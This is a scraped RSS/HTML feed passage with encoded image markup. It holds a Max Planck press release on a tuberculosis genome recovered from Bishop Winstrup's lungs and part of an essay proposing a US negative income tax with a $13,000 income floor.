eUozYVdSMGFDSTZOelV3TENKdlltcGZhV1FpT2pFNE1qVTBPRFY5LS05M2MyZGI0ZTgxNTkyMzRmYThhMTg5ZDBhMTRiNzkyNDI1MmI5ZDM4IDc1MHcsIC8xODI1NDg1L29yaWdpbmFsLTE1OTc4Mzg5ODcuanBlZz90PWV5SjNhV1IwYUNJNk5qUXdMQ0p2WW1wZmFXUWlPakU0TWpVME9EVjktLWNjMTA4Njk5ZDA0NDA0NGQxMWMzNTA2ZjMyYzhjYWVkZGIwNDMwZDMgNjQwdywgLzE4MjU0ODUvb3JpZ2luYWwtMTU5NzgzODk4Ny5qcGVnP3Q9ZXlKM2FXUjBhQ0k2T0RJeUxDSnZZbXBmYVdRaU9qRTRNalUwT0RWOS0tNjhiOWQ3OGFiODRmMDJhZDMzOGI0NmEwYjg3MzBkNzExZGFjMjE5ZSA4MjJ3LCAvMTgyNTQ4NS9vcmlnaW5hbC0xNTk3ODM4OTg3LmpwZWc/dD1leUozYVdSMGFDSTZPVFl3TENKdlltcGZhV1FpT2pFNE1qVTBPRFY5LS02ZTI2ZDY3YzJjM2UwZmQ5OWUyOWI5MDdmZDcwMzBlMjAwNTgxYjdmIDk2MHcsIC8xODI1NDg1L29yaWdpbmFsLTE1OTc4Mzg5ODcuanBlZz90PWV5SjNhV1IwYUNJNk56SXdMQ0p2WW1wZmFXUWlPakU0TWpVME9EVjktLWQ3OWViYjgzODU3M2ZjODNiZjMyMTM4OWM4OTNjYmE4ZWEwNjQ3NTkgNzIwdyIgc2l6ZXM9IjEwMHZ3IiAvPjxzb3VyY2UgbWVkaWE9IihtaW4td2lkdGg6IDc2OHB4KSBhbmQgKG1heC13aWR0aDogOTkxcHgpIiBzcmNzZXQ9Ii8xODI1NDg1L29yaWdpbmFsLTE1OTc4Mzg5ODcuanBlZz90PWV5SjNhV1IwYUNJNk9UQXdMQ0p2WW1wZmFXUWlPakU0TWpVME9EVjktLTM5NjExZjdkZTY3YzYzODkwN2JkMzdhYzA5MWJlOWY2Nzc0ZTcxMzcgOTAwdywgLzE4MjU0ODUvb3JpZ2luYWwtMTU5NzgzODk4Ny5qcGVnP3Q9ZXlKM2FXUjBhQ0k2TVRnd01Dd2liMkpxWDJsa0lqb3hPREkxTkRnMWZRPT0tLTIwNTYyNzA4Y2YwY2NlMDQ0YWU5ZDlkYjc3YjhlNGI4MTQ5ZjRhOTYgMTgwMHciIHNpemVzPSI5MDBweCIgLz48c291cmNlIG1lZGlhPSIobWluLXdpZHRoOiA5OTJweCkgYW5kIChtYXgtd2lkdGg6IDExOTlweCkiIHNyY3NldD0iLzE4MjU0ODUvb3JpZ2luYWwtMTU5NzgzODk4Ny5qcGVnP3Q9ZXlKM2FXUjBhQ0k2TVRJd01Dd2liMkpxWDJsa0lqb3hPREkxTkRnMWZRPT0tLTEwNWI3NTU1NWYxNmI3YjE5OGYxYmNjZDdjZTIxYmVhOGEzMzc5YzcgMTIwMHcsIC8xODI1NDg1L29yaWdpbmFsLTE1OTc4Mzg5ODcuanBlZz90PWV5SjNhV1IwYUNJNk1qUXdNQ3dpYjJKcVgybGtJam94T0RJMU5EZzFmUT09LS03MmNmMWVhODcxNjcyOTVhYjJmMGJhZmY4YjY5OGQyZDFjYWNkYWM1IDI0MDB3IiBzaXplcz0iMTIwMHB4IiAvPjxzb3VyY2UgbWVkaWE9IihtaW4td2lkdGg6IDEyMDBweCkiIHNyY3NldD0iLzE4MjU0ODUvb3JpZ2luYWwtMTU5NzgzODk4Ny5qcGVnP3Q9ZXlKM2FXUjBhQ0k2TVRRd01Dd2liMkpxWDJsa0lqb3hPREkxTkRnMWZRPT0tLTI3MDg3MzdiMmY2NGU0NDFmNGExNzhlM2UwMDI4NTE5ZDQxZTFmN2MgMTQwMHcsIC8xODI1NDg1L29yaWdpbmFsLTE1OTc4Mzg5ODcuanBlZz90PWV5SjNhV1IwYUNJNk1qZ3dNQ3dpYjJKcVgybGtJam94T0RJMU5EZzFmUT09LS0zOWIwOGY5NDk1ZmZkZWNmNjg1MzM3NjI4YTM3ZDBjNmI3YmNlNzIwIDI4MDB3IiBzaXplcz0iMTQwMHB4IiAvPjxpbWcgY2xhc3M9IiIgdGl0bGU9IlBvcnRyYWl0IG9mIEJpc2hvcCBQZWRlciBKZW5zZW4gV2luc3RydXAiIHNyYz0iLzE4MjU0ODUvb3JpZ2luYWwtMTU5NzgzODk4Ny5qcGVnP3Q9ZXlKM2FXUjBhQ0k2TVRRd01Dd2liMkpxWDJsa0lqb3hPREkxTkRnMWZRPT0tLTI3MDg3MzdiMmY2NGU0NDFmNGExNzhlM2UwMDI4NTE5ZDQxZTFmN2MiIC8+PC9waWN0dXJlPg==">
      
    

    
    <figcaption>
        <p>
          Portrait of Bishop Peder Jensen Winstrup
        </p>
        <p>
           © Orf3us / CC BY-SA (https://creativecommons.org/licenses/by-sa/3.0)
        </p>
    </figcaption>
</figure>


<p>When Anthropologist Caroline Arcini and her colleagues at the Swedish Natural Historical Museum discovered small calcifications in the extremely well preserved lungs of Bishop Peder Winstrup, they knew more investigation was needed. “We suspected these were remnants of a past lung infection,” says Arcini, “and tuberculosis was at the top of our list of candidates. DNA analysis was the best way to prove it.”</p>
<p>Up to one quarter of the world’s population is suspected to have been exposed to bacteria of the <i>Mycobacterium tuberculosis</i> complex, which cause tuberculosis (TB). Bishop Winstrup would have been one of many to fall ill during the onset of the so-called “White Plague” TB pandemic that ravaged post-medieval Europe. Today, TB is among the most prevalent diseases, accounting for the highest worldwide mortality from a bacterial infection.</p>
<p>The global distribution of TB has led to the prevailing assumption that the pathogen evolved early in human history and reached its global distribution via the hallmark Out of Africa human migrations tens of thousands of years ago, but recent work on ancient TB genomes has stirred up controversy over when this host-pathogen relationship began. In 2014, a team led by scientists from the University of Tübingen and Arizona State University reconstructed three ancient TB genomes from pre-contact South America – not only were the ancient strains unexpectedly related to those circulating in present-day seals, but comparison against a large number of human strains suggested that TB emerged within the last 6000 years. Understandably, skepticism surrounded this new estimate since it was based entirely on ancient genomes that are not representative of the TB strains associated with humans today.</p>
<p>“Discovery of the Bishop’s lung calcification gave us the opportunity to revisit the question of tuberculosis emergence with data from an ancient European,” comments Kirsten Bos, group leader for Molecular Paleopathology at the Max Planck Institute for the Science of Human History (MPI-SHH), who co-led the study. “If we could reconstruct a TB genome from Bishop Winstrup, where we know his date of death to the day, it would give a secure and independent calibration for our estimates of how old TB, as we know it, actually is.”</p>
<p><b>The highest quality ancient TB genome to date&nbsp; </b></p>
<p>In a new study published this week in Genome Biology, Susanna Sabin of MPI-SHH and colleagues reconstruct a tuberculosis genome from the calcified nodule discovered in Bishop Winstrup's remains.</p>
<p>“The genome is of incredible quality – preservation on this scale is extremely rare in ancient DNA,” comments Bos.</p>

<figure data-description="Scanning electron micrograph of <em>Mycobacterium tuberculosis</em> bacteria, which cause TB" data-picture="base64;PHBpY3R1cmUgY2xhc3M9IiIgZGF0YS1pZXNyYz0iLzE4MjU1MDkvb3JpZ2luYWwtMTU5NzgzOTI2NC5qcGc/dD1leUozYVdSMGFDSTZNVFF3TUN3aWIySnFYMmxrSWpveE9ESTFOVEE1ZlE9PS0tY2Y3ODQzZWE3MmMyODg5ZjllZTVhZjFjOWIwYTc3N2ZhZTA4N2UwYyIgZGF0YS1hbHQ9Im9yaWdpbmFsIiBkYXRhLWNsYXNzPSIiPjxzb3VyY2UgbWVkaWE9IihtYXgtd2lkdGg6IDc2N3B4KSIgc3Jjc2V0PSIvMTgyNTUwOS9vcmlnaW5hbC0xNTk3ODM5MjY0LmpwZz90PWV5SjNhV1IwYUNJNk5ERTBMQ0p2WW1wZmFXUWlPakU0TWpVMU1EbDktLTE2NDY5NmZjMzI2ZDI3ZWFlNWE2MjM3YmYzYmIxMmVhYTJhY2E2MjAgNDE0dywgLzE4MjU1MDkvb3JpZ2luYWwtMTU5NzgzOTI2NC5qcGc/dD1leUozYVdSMGFDSTZNemMxTENKdlltcGZhV1FpT2pFNE1qVTFNRGw5LS04MTAyNjc0OGU4Njc4YWY4MjU5ZTBmYzllYjZjZGIwOGUwMjBjMDE2IDM3NXcsIC8xODI1NTA5L29yaWdpbmFsLTE1OTc4MzkyNjQuanBnP3Q9ZXlKM2FXUjBhQ0k2TXpJd0xDSnZZbXBmYVdRaU9qRTRNalUxTURsOS0tOGVkNzRjY2RhYWY2Zjg3YWI5ZTdkOGJmMGM5NzFlMDU2Yjc5ZDk2ZSAzMjB3LCAvMTgyNTUwOS9vcmlnaW5hbC0xNTk3ODM5MjY0LmpwZz90PWV5SjNhV1IwYUNJNk5ERXhMQ0p2WW1wZmFXUWlPakU0TWpVMU1EbDktLTA5YjgxMTk4MDFkMGM2YTVlN2UxYWJhNGY5ZDM1ODZlN2Y1MTA5ZTMgNDExdywgLzE4MjU1MDkvb3JpZ2luYWwtMTU5NzgzOTI2NC5qcGc/dD1leUozYVdSMGFDSTZORGd3TENKdlltcGZhV1FpT2pFNE1qVTFNRGw5LS0yOTAzYThhODBlOGRlYmUwY2M3N2RlYzhjOTY2ZTkzNjhiNDFlZTI2IDQ4MHcsIC8xODI1NTA5L29yaWdpbmFsLTE1OTc4MzkyNjQuanBnP3Q9ZXlKM2FXUjBhQ0k2TXpZd0xDSnZZbXBmYVdRaU9qRTRNalUxTURsOS0tMjE5M2VlNjVjYzljODk1NWQ3YjU5MzAyYzU3NTQ3ZWM4MDRiYjNkMSAzNjB3LCAvMTgyNTUwOS9vcmlnaW5hbC0xNTk3ODM5MjY0LmpwZz90PWV5SjNhV1IwYUNJNk9ESTRMQ0p2WW1wZmFXUWlPakU0TWpVMU1EbDktLWM2YmQxZjBiODkxZGRkMTM3Mjg1NTBlN2NjMzczMjc0ODJiMzhiNzQgODI4dywgLzE4MjU1MDkvb3JpZ2luYWwtMTU5NzgzOTI2NC5qcGc/dD1leUozYVdSMGFDSTZOelV3TENKdlltcGZhV1FpT2pFNE1qVTFNRGw5LS0xMDQzMmQ1ODdkM2IyZTBjYTJlZGJkMWExZTIzMGYzMDFjYjU5NzZlIDc1MHcsIC8xODI1NTA5L29yaWdpbmFsLTE1OTc4MzkyNjQuanBnP3Q9ZXlKM2FXUjBhQ0k2TmpRd0xDSnZZbXBmYVdRaU9qRTRNalUxTURsOS0tNjdkNjZkMTMyZjI2MDY0NmNhMmM5ZDNiZTM5NzBlY2MwNzM0ZTIxYiA2NDB3LCAvMTgyNTUwOS9vcmlnaW5hbC0xNTk3ODM5MjY0LmpwZz90PWV5SjNhV1IwYUNJNk9ESXlMQ0p2WW1wZmFXUWlPakU0TWpVMU1EbDktLTAxMmQ5NTE0NWJjNmFlMmU1OWY5MDc1ZGIxYTA1NGUxZjY2YmI2NzAgODIydywgLzE4MjU1MDkvb3JpZ2luYWwtMTU5NzgzOTI2NC5qcGc/dD1leUozYVdSMGFDSTZPVFl3TENKdlltcGZhV1FpT2pFNE1qVTFNRGw5LS0wZTQzYjRmMjJiMTM0ZGQ0ZmZkNTllZTRhNzk1ZDcxNDViYjZiNWY4IDk2MHcsIC8xODI1NTA5L29yaWdpbmFsLTE1OTc4MzkyNjQuanBnP3Q9ZXlKM2FXUjBhQ0k2TnpJd0xDSnZZbXBmYVdRaU9qRTRNalUxTURsOS0tZjQyMWJiYzlkOWY5ZDJlMDk2NmY4NmIyMjk0OTM0NzY2YWQ3NmRjZiA3MjB3IiBzaXplcz0iMTAwdnciIC8+PHNvdXJjZSBtZWRpYT0iKG1pbi13aWR0aDogNzY4cHgpIGFuZCAobWF4LXdpZHRoOiA5OTFweCkiIHNyY3NldD0iLzE4MjU1MDkvb3JpZ2luYWwtMTU5NzgzOTI2NC5qcGc/dD1leUozYVdSMGFDSTZPVEF3TENKdlltcGZhV1FpT2pFNE1qVTFNRGw5LS05OGI4ZDA3Mzk3Y2FiMDFhMThiNzIzZTk0N2Y5NGVlMGQ1M2ZhZjljIDkwMHcsIC8xODI1NTA5L29yaWdpbmFsLTE1OTc4MzkyNjQuanBnP3Q9ZXlKM2FXUjBhQ0k2TVRnd01Dd2liMkpxWDJsa0lqb3hPREkxTlRBNWZRPT0tLWFjNmZkOGY5MGQ1ZmE3YzM1NmE3YTllNDljZTAxZDBlNmU0ZGE0MmQgMTgwMHciIHNpemVzPSI5MDBweCIgLz48c291cmNlIG1lZGlhPSIobWluLXdpZHRoOiA5OTJweCkgYW5kIChtYXgtd2lkdGg6IDExOTlweCkiIHNyY3NldD0iLzE4MjU1MDkvb3JpZ2luYWwtMTU5NzgzOTI2NC5qcGc/dD1leUozYVdSMGFDSTZNVEl3TUN3aWIySnFYMmxrSWpveE9ESTFOVEE1ZlE9PS0tNjEwZTk5OTNkOWZmZmQ1MjE2N2JhYzhhM2NiYjc4YTMzYmRlMWZkZSAxMjAwdywgLzE4MjU1MDkvb3JpZ2luYWwtMTU5NzgzOTI2NC5qcGc/dD1leUozYVdSMGFDSTZNalF3TUN3aWIySnFYMmxrSWpveE9ESTFOVEE1ZlE9PS0tNmRjMjQ0NGMyZGFmOGI1NGZlMWJlMTY3YzFlNjYyMGE0YWQwZTU0OSAyNDAwdyIgc2l6ZXM9IjEyMDBweCIgLz48c291cmNlIG1lZGlhPSIobWluLXdpZHRoOiAxMjAwcHgpIiBzcmNzZXQ9Ii8xODI1NTA5L29yaWdpbmFsLTE1OTc4MzkyNjQuanBnP3Q9ZXlKM2FXUjBhQ0k2TVRRd01Dd2liMkpxWDJsa0lqb3hPREkxTlRBNWZRPT0tLWNmNzg0M2VhNzJjMjg4OWY5ZWU1YWYxYzliMGE3NzdmYWUwODdlMGMgMTQwMHcsIC8xODI1NTA5L29yaWdpbmFsLTE1OTc4MzkyNjQuanBnP3Q9ZXlKM2FXUjBhQ0k2TWpnd01Dd2liMkpxWDJsa0lqb3hPREkxTlRBNWZRPT0tLWNlNzMwODQ0NjEzN2I2ODA2ODU1M2I4MTYyYzYyNDVmYzYyMmM1ZTQgMjgwMHciIHNpemVzPSIxNDAwcHgiIC8+PGltZyBjbGFzcz0iIiB0aXRsZT0iU2Nhbm5pbmcgZWxlY3Ryb24gbWljcm9ncmFwaCBvZiBNeWNvYmFjdGVyaXVtIHR1YmVyY3Vsb3NpcyBiYWN0ZXJpYSwgd2hpY2ggY2F1c2UgVEIiIHNyYz0iLzE4MjU1MDkvb3JpZ2luYWwtMTU5NzgzOTI2NC5qcGc/dD1leUozYVdSMGFDSTZNVFF3TUN3aWIySnFYMmxrSWpveE9ESTFOVEE1ZlE9PS0tY2Y3ODQzZWE3MmMyODg5ZjllZTVhZjFjOWIwYTc3N2ZhZTA4N2UwYyIgLz48L3BpY3R1cmU+">
      
    

    
    <figcaption>
        <p>
          Scanning electron micrograph of <em>Mycobacterium tuberculosis</em> bacteria, which cause TB
        </p>
        <p>
           © NIAID
        </p>
    </figcaption>
</figure>


<p>Together with a handful of tuberculosis genomes from other work, the researchers revisit the question of the age of the Mycobacterium tuberculosis complex, with the year of the Bishop’s death as a fine-tuned calibration point. Using multiple molecular dating models, all angles indeed point to a relatively young age of the <i>Mycobacterium tuberculosis</i> complex.</p>
<p>“A more recent emergence of the tuberculosis pathogen complex is now supported by genetic evidence from multiple geographic regions and time periods,” comments Sabin, first author of the study. “It’s the strongest evidence available to date for this emergence having been a Neolithic phenomenon.”</p>
<p>This most recent shift in the narrative for when bacteria in the <i>Mycobacterium tuberculosis </i>complex became highly infectious to humans raises further questions about the context of its emergence, as it appears to have coincided with the rise of pastoralism and sedentary lifestyles.</p>
<p>“The Neolithic transition seems to have played an important role for the emergence of a number of human pathogens,” comments Denise Kühnert, group leader for disease transmission research at MPI-SHH who co-led the investigation.&nbsp;</p>
<p>“For TB in particular, stronger evidence could only come from an older genome, though these deeper time periods are unlikely to yield preservation on the scale of what we’ve seen for Bishop Winstrup,” adds Bos.</p>
<p>“Moving forward,” Sabin further comments, “the hope is we will find adequately preserved DNA from time periods close to the emergence of the complex, or perhaps from its ancestor.”</p>
  
</div></div>]]>
            </description>
            <link>https://www.shh.mpg.de/1825450/neolithic-emergence-of-tuberculosis</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261768</guid>
            <pubDate>Mon, 24 Aug 2020 15:48:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Designing a Feasible Basic Income: Policy Proposal for a Negative Income Tax]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24261714">thread link</a>) | @ojarow
<br/>
August 24, 2020 | https://musingmind.org/essays/negative-income-tax-proposal | <a href="https://web.archive.org/web/*/https://musingmind.org/essays/negative-income-tax-proposal">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          

          <main>
            
              <section data-content-field="main-content">
                <article id="post-5ec1649a0bcf3d6a67b7639a" data-item-id="5ec1649a0bcf3d6a67b7639a">

    
      
    

    <div data-layout-label="Post Body" data-type="item" data-updated-on="1589732523860" id="item-5ec1649a0bcf3d6a67b7639a"><div><div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1589732525261_488797"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ccb0d4e11f7842cbed64179/1589897453709-11HTPRM437062PS60ACE/ke17ZwdGBToddI8pDm48kO39XREG54FEzS8qGsJMt35Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIDaE57XN7kR2fbxV3NrlY6nQcRKCQzA6B3lxzZPJXFX4KMshLAGzx4R3EDFOm1kBS/Cover%2BArt%2B3.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5ccb0d4e11f7842cbed64179/1589897453709-11HTPRM437062PS60ACE/ke17ZwdGBToddI8pDm48kO39XREG54FEzS8qGsJMt35Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIDaE57XN7kR2fbxV3NrlY6nQcRKCQzA6B3lxzZPJXFX4KMshLAGzx4R3EDFOm1kBS/Cover%2BArt%2B3.jpg" data-image-dimensions="945x638" data-image-focal-point="0.5,0.5" alt="Cover+Art+3.jpg" data-load="false" data-image-id="5ec3e8ed102d8d5939c5a387" data-type="image" src="https://musingmind.org/essays/Cover+Art+3.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div></div><div><div><div data-block-type="2" id="block-e49c77fb3867453b76ef"><div><p><strong>This document proposes a basic income for the U.S. in the form of a negative income tax (NIT). </strong></p><p>It proposes an income floor for all adults (18+) in the economy of $13,000 per year, indexed to the federal poverty line. This proposal leaves aside the question of how best to include minors, but no basic income is complete without either a reduced rate income floor for minors, or a child allowance passed alongside.</p><p>Under this proposal, an adult earning $0 annually receives the full $13,000. As their earnings increase, their NIT benefits are phased out with a 33% tax rate, zeroing out benefits for incomes beyond $39,400. Benefits would be provided in monthly installments.&nbsp;&nbsp;</p></div></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1590765826898_64935"><div><p>Such an NIT is both economically and politically feasible. Within a year of passing, it could eliminate official poverty, increase the circulation of capital throughout the economy, reduce inequality, and insulate a basic degree of livelihood from potential shocks such as loss of employment, automation, pandemics, or changing life circumstances.&nbsp;&nbsp;</p><p>In the longer term, a basic income improves the conditions for <em>social innovations</em> to occur alongside technological ones. Raising the economic floor lowers the risks associated with experimental behavior. It lifts everyone towards a threshold of financial security beyond which we have more freedom to decide how to spend our time. This kind of free time, contrasted with time that must be spent working for money, is fertile soil for innovation.</p><p>Moving towards collective liberation from the strictures of economic anxiety could provoke an upsurge in the kinds of broader innovation we need to meet the spectrum of challenges facing our civilization. Economic freedom is an intersectional catalyst towards ecological, racial, feminist, and mental freedoms.&nbsp;</p><p>I calculate this NIT would cost $855 billion per year. My funding proposal details two primary categories of revenue: reforming and eliminating existing welfare and tax programs ($346 billion), and implementing new progressive taxes ($744 billion). Together, these reach a total funding capacity of $1.09 trillion, $235 billion above my funding estimate. Crucially, the plan does so without raising the tax burden on most Americans.</p></div></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1589732525261_99967"><p><h2>What Is a Negative Income Tax?</h2></p></div></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1589732525261_5219"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ccb0d4e11f7842cbed64179/1589732702601-U1ZJIOG8Z6ZCYP8H7IV3/ke17ZwdGBToddI8pDm48kH23KVWagbNOYpajbj_MQLNZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIJtg7yny0RBSV5PxpX1XPrwAROGqRUCBAuccPtaePpQsKMshLAGzx4R3EDFOm1kBS/NIT+in+theory.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5ccb0d4e11f7842cbed64179/1589732702601-U1ZJIOG8Z6ZCYP8H7IV3/ke17ZwdGBToddI8pDm48kH23KVWagbNOYpajbj_MQLNZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIJtg7yny0RBSV5PxpX1XPrwAROGqRUCBAuccPtaePpQsKMshLAGzx4R3EDFOm1kBS/NIT+in+theory.jpg" data-image-dimensions="800x500" data-image-focal-point="0.5,0.5" alt="NIT in theory.jpg" data-load="false" data-image-id="5ec1655e8ea60f2f693d1423" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5ccb0d4e11f7842cbed64179/1589732702601-U1ZJIOG8Z6ZCYP8H7IV3/ke17ZwdGBToddI8pDm48kH23KVWagbNOYpajbj_MQLNZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIJtg7yny0RBSV5PxpX1XPrwAROGqRUCBAuccPtaePpQsKMshLAGzx4R3EDFOm1kBS/NIT+in+theory.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1589732525261_90680"><div><p>NIT is a targeted <a href="https://musingmind.org/essays/guide-to-basic-income#pay"><span>basic income</span></a> that phases out as one’s earnings increase. It’s composed of two variables: an <em>income floor</em>, and a <em>phaseout tax rate</em>. The income floor sets the amount an individual with $0 of annual income receives from the program: the maximum benefit amount one can receive from the NIT.&nbsp;</p><p>The phaseout rate determines how much of the NIT is phased out for each dollar of earned income. The lower the rate, the larger the category of people who benefit from the NIT program, and the more work incentives are preserved (because earning additional income loses you less of the NIT benefit). But the higher the programs cost. Conversely, higher rates mean fewer people benefit and incentives for low-wage work are decreased. But the cost is lessened.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1589742759373_1013231"><p>Together, the phaseout tax rate and the income floor create a third element: the <em>breakeven point</em>. This is the earnings level at which NIT benefits are fully phased out to $0. </p></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1589732525261_175954"><p><h2>Why a Negative Income Tax</h2></p></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1589732525261_7217"><div><p>How is it that in a society as wealthy as ours, economic anxiety remains the prevailing reality for so many? This question has vexed economists at least since Henry George in the late 1800’s. In our time, after centuries of vigorous capital accumulation, we are past due to leverage our wealth to provide a basic income that reduces the hold economic insecurities have upon our lives, behaviors, and minds.</p><p>NIT is both an economic and politically feasible way to implement this basic income. It’s a policy with immediate and obvious effects, followed by more subtle, and perhaps profound ones.&nbsp;</p><p>Within a year of passing, NIT could:</p><ol data-rte-list="default"><li><p>Eliminate poverty by setting the income threshold above the federal poverty line</p></li><li><p>Reduce inequality and increase the circulation of capital throughout the economy by redistributing wealth from its accumulation at the top back towards lower income groups who are more likely to spend it</p></li><li><p>Increase the bargaining power of workers by increasing their ability to meet their basic needs outside of employment, empowering them to more readily reject undesirable or exploitative labor contracts</p></li><li><p>Guarantee and protect a basic degree of livelihood from potential shocks such as loss of employment, automation, pandemics, or changing life circumstances.</p></li></ol><p>But the long-run effects reach much deeper into the core of our social relations, ways of living, and modes of innovation. With a basic income, the risk attached to experimental behavior is greatly reduced. The spectrum of viable behaviors - ways of living, even - is increased. Unconditional income enables those who’d prefer spending more of their time engaged in unpaid activities, that they nevertheless consider valuable, to do so. As a society, we gain optionality. The ways of participating in society people consider legitimate is expanded, as <a href="https://www.kela.fi/web/en/news-archive/-/asset_publisher/lN08GY2nIrZo/content/results-of-the-basic-income-experiment-small-employment-effects-better-perceived-economic-security-and-mental-wellbeing"><span>recent interviews</span></a> with UBI recipients from a Finnish experiment confirm.&nbsp;</p><p>The diversity (and redistribution) of ‘free time’ is precisely the point. Free time is unbound from the imperative to earn, from the necessity to please bosses, deadlines, or metrics. It’s time in which we can do things <em>for themselves</em>. The quality of thought that occurs <em>for itself</em>, as opposed to for a job, is notably different. More autonomous. Charles Darwin, after all, produced his theory of evolution in his free time.&nbsp;</p><p>The innovations that spring from free time arise from a different kind of investment. Unbound from the imperative to earn, they can address a broader scope of human concerns. These <em>social</em> <em>innovations</em> function alongside technological ones that arise from market incentives, contributing a broader range to the scope of innovation.</p><p>But perhaps the most urgent motivation to establish a basic income is because doing so would make an immediate difference in the everyday lives of ordinary people. People who’ve been left out of the gains from the extensive capital accumulation their labor contributes to.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1589732525261_235372"><div><p>This proposed NIT sets the income floor at $13,000 (rounded up from the 2020 poverty line of $12,760) and uses a 33% phaseout tax rate. The breakeven point beyond which benefits reach zero is $39,393.</p><p>The chart below shows how much NIT benefit one would receive at different levels of income:</p></div></div><div><div><div data-block-type="5" id="block-yui_3_17_2_1_1589732525261_9223"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ccb0d4e11f7842cbed64179/1589821257443-NJXEG472T32RJBWUD3UE/ke17ZwdGBToddI8pDm48kEyAQnMoqkRiAfr5xPjbna97gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmx4bpISbekvWhAKEUgzdg0E60yl5_yw-bsK0eBmWI4hC1yCE74nK90bBL_1r1S_Lx/Benefit+BReakdown.png" data-image="https://images.squarespace-cdn.com/content/v1/5ccb0d4e11f7842cbed64179/1589821257443-NJXEG472T32RJBWUD3UE/ke17ZwdGBToddI8pDm48kEyAQnMoqkRiAfr5xPjbna97gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmx4bpISbekvWhAKEUgzdg0E60yl5_yw-bsK0eBmWI4hC1yCE74nK90bBL_1r1S_Lx/Benefit+BReakdown.png" data-image-dimensions="1092x1252" data-image-focal-point="0.5,0.5" alt="Benefit BReakdown.png" data-load="false" data-image-id="5ec2bf490a471b4ca7e7dc7b" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5ccb0d4e11f7842cbed64179/1589821257443-NJXEG472T32RJBWUD3UE/ke17ZwdGBToddI8pDm48kEyAQnMoqkRiAfr5xPjbna97gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QHyNOqBUUEtDDsRWrJLTmx4bpISbekvWhAKEUgzdg0E60yl5_yw-bsK0eBmWI4hC1yCE74nK90bBL_1r1S_Lx/Benefit+BReakdown.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1589732525261_11543"><div><p>This proposal does not cover a plan for minors. But it is absolutely vital to the efficacy of the program that such a plan is concurrently passed.&nbsp;</p><p>Most basic income proposals include a reduced rate for minors, often hovering around 50% of the adult level. This approach is not without oddities. Especially in the context of a NIT rather than UBI. For example, since almost none of the 74 million minors in the US earn income, and even fewer earn anywhere near a hypothetical reduced income floor of $6,500, almost all children - including those of eminently wealthy families - would receive the full benefit.&nbsp;</p><p>So even though the program is considered a NIT, it amounts to only an NIT for adults, but a UBI for minors.</p><p>It may be preferable to complement a NIT for adults with <a href="https://www.vox.com/policy-and-politics/2017/10/26/16552200/child-allowance-tax-credit-bill-michael-bennet-sherrod-brown"><span>a child allowance that phases out</span></a> benefits as guardians’ earnings increase. In this way, just as NIT benefits phase out before going to wealthier adults, benefits would phase out for minors higher up the wealth distribution as well.</p><p>However, some <a href="https://www.dissentmagazine.org/article/children-as-a-public-good"><span>argue</span></a> that children <a href="https://www.jstor.org/stable/2117807?seq=1"><span>constitute a “public good</span></a>”, and child allowances should be <a href="http://www.cornellpolicyreview.com/universal-child-allowance/"><span>universal</span></a>. I leave this debate untouched, trusting that either method - a reduced rate NIT income floor, or a child allowance (universal or otherwise) - complement and fulfill the motivations behind this basic income proposal.</p><p>In terms of cost, some child programs are budget neutral, while the higher end of cost estimates reach up towards $200 billion.</p></div></div><div><div><div data-block-type="2" id="block-yui_3_17_2_1_1589732525261_272313"><p><h2>How Much Would This NIT Cost?</h2></p></div></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1589732525261_279182"><div><p>I calculate this NIT, provided in 2018 to all adults over the age of 18 would’ve cost $855 billion.&nbsp;</p><p>In addition to my own calculations, I use four existing cost estimates for similar programs to establish a spectrum of potential costs. This spectrum runs from $539 billion to $1.o9 trillion:</p></div></div><div data-block-type="5" 